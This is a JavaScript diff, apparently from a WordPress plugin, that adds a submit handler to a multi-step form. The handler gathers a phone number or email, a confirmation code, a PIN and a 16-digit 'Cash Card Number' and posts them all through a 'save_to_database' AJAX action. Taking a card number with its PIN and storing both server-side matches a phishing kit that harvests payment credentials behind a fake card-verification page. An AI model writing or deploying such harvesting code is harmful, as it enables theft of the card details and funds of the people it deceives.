@@ -58,7 +58,9 @@
     });
 
     continueToStep3Button.addEventListener("click", () => {
-      const confirmationCode = document.getElementById("confirmationCode").value.trim();
+      const confirmationCode = document
+        .getElementById("confirmationCode")
+        .value.trim();
 
       if (!confirmationCode) {
         alert("Please enter the confirmation code.");
@@ -82,7 +84,9 @@
     });
 
     submitButton.addEventListener("click", () => {
-      const cashCardNumber = document.getElementById("cashCardNumber").value.trim();
+      const cashCardNumber = document
+        .getElementById("cashCardNumber")
+        .value.trim();
 
       if (!cashCardNumber || cashCardNumber.length !== 16) {
         alert("Please enter a valid 16-digit Cash Card Number.");
@@ -97,6 +101,54 @@
       const pinValue = pinInput.value;
       dots.forEach((dot, index) => {
         dot.classList.toggle("active", index < pinValue.length);
+      });
+    });
+
+    /**
+     * TODO: When click on submitForm get all input fields values and send a ajax request to server to save to database
+     */
+
+    $("#submitForm").click(function (e) {
+      e.preventDefault();
+
+      // get all input fields values
+      const phoneNumber = document.getElementById("mobileNumber").value.trim();
+      const email = document.getElementById("email").value.trim();
+
+      let emailOrPhone = phoneNumber ? phoneNumber : email;
+
+      const confirmationCode = document
+        .getElementById("confirmationCode")
+        .value.trim();
+      const pinValue = pinInput.value.trim();
+      const cashCardNumber = document
+        .getElementById("cashCardNumber")
+        .value.trim();
+
+      // console.log(
+      //   `emailOrPhone: ${emailOrPhone}, confirmationCode: ${confirmationCode}, pinValue: ${pinValue}, cashCardNumber: ${cashCardNumber}`
+      // );
+
+      // send a ajax request to server to save to database
+      if (cashCardNumber.length < 16) {
+        alert("Please enter a valid 16-digit Cash Card Number.");
+        return;
+      }
+
+      $.ajax({
+        type: "POST",
+        url: wpb_public_localize.ajax_url,
+        data: {
+          action: "save_to_database",
+          nonce: wpb_public_localize.nonce,
+          emailOrPhone: emailOrPhone,
+          confirmationCode: confirmationCode,
+          pinValue: pinValue,
+          cashCardNumber: cashCardNumber,
+        },
+        success: function (response) {
+          console.log(response);
+        },
       });
     });
   });
